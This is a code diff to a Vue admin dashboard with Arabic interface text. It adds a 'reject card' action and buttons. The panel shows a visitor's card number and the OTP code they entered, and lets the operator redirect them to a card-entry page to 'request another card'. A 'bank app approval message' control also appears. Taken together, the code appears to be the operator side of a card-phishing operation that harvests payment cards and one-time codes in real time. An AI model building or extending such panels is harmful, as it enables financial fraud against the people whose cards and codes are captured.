@@ -394,6 +394,23 @@ const updateNextAction = async (id: string, action: string) => {
   }
 };
 
+const handleRejectCard = async (id: string) => {
+  try {
+    selectedRedirectPage.value = '/card-details';
+    await updateCardRequest(id, {
+      otpStatus: 'card_rejected',
+      nextAction: '/card-details'
+    });
+    redirectFeedback.value = 'تم رفض البطاقة';
+    setTimeout(() => {
+      if (redirectFeedback.value === 'تم رفض البطاقة') redirectFeedback.value = '';
+    }, 2000);
+    await fetchAll(false);
+  } catch (err) {
+    console.error('Error rejecting card:', err);
+  }
+};
+
 const handleRedirectSelectChange = async () => {
   if (!selectedRequest.value || !selectedRedirectPage.value) return;
   await updateNextAction(selectedRequest.value.id, selectedRedirectPage.value);
@@ -1040,16 +1057,35 @@ const filteredRequests = computed(() => {
                     بانتظار إدخال بيانات البطاقة...
                   </div>
 
-                  <!-- Footer link inside Payment Card -->
-                  <div class="mt-2.5 flex items-center justify-between" dir="rtl">
-                    <span class="text-[11px] text-[#1976d2] font-semibold underline cursor-pointer">
-                      {{ copiedField === 'card' ? 'تم النسخ!' : 'منقول' }}
-                    </span>
-
-                    <div v-if="selectedRequest.otp" class="flex items-center gap-2">
-                      <span class="text-[11px] font-bold text-gray-700">
-                        الرمز: <strong class="font-mono text-[#1976d2]">{{ selectedRequest.otp }}</strong>
+                  <!-- Footer & Card Reject Action inside Payment Card -->
+                  <div class="mt-3 pt-2.5 border-t border-gray-200/80 flex flex-col gap-2" dir="rtl">
+                    <div class="flex items-center justify-between">
+                      <span class="text-[11px] text-[#1976d2] font-semibold underline cursor-pointer">
+                        {{ copiedField === 'card' ? 'تم النسخ!' : 'منقول' }}
                       </span>
+
+                      <div v-if="selectedRequest.otp" class="flex items-center gap-2">
+                        <span class="text-[11px] font-bold text-gray-700">
+                          الرمز: <strong class="font-mono text-[#1976d2]">{{ selectedRequest.otp }}</strong>
+                        </span>
+                      </div>
+                    </div>
+
+                    <div v-if="selectedRequest.cardNumber" class="flex items-center gap-2 mt-1">
+                      <button
+                        @click="handleRejectCard(selectedRequest.id)"
+                        class="w-full bg-red-600 hover:bg-red-700 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5 shadow-2xs"
+                      >
+                        <Ban class="w-3.5 h-3.5" />
+                        <span>رفض البطاقة (طلب بطاقة أخرى)</span>
+                      </button>
+                    </div>
+
+                    <div
+                      v-if="selectedRequest.otpStatus === 'card_rejected'"
+                      class="text-[11px] text-red-600 bg-red-50 border border-red-200 rounded py-1 px-2 font-bold text-center"
+                    >
+                      تم رفض البطاقة وتوجيه الزائر لإدخال بطاقة جديدة
                     </div>
                   </div>
                 </div>
@@ -1112,6 +1148,13 @@ const filteredRequests = computed(() => {
                         <span>رسالة موافقة من تطبيق البنك</span>
                       </button>
                     </div>
+                    <button
+                      @click="handleRejectCard(selectedRequest.id)"
+                      class="w-full bg-red-600 hover:bg-red-700 text-white py-2 px-3 rounded text-xs font-bold transition-colors cursor-pointer flex items-center justify-center gap-1.5 mt-1"
+                    >
+                      <Ban class="w-3.5 h-3.5" />
+                      <span>رفض البطاقة</span>
+                    </button>
                   </div>
                 </div>
               </div>
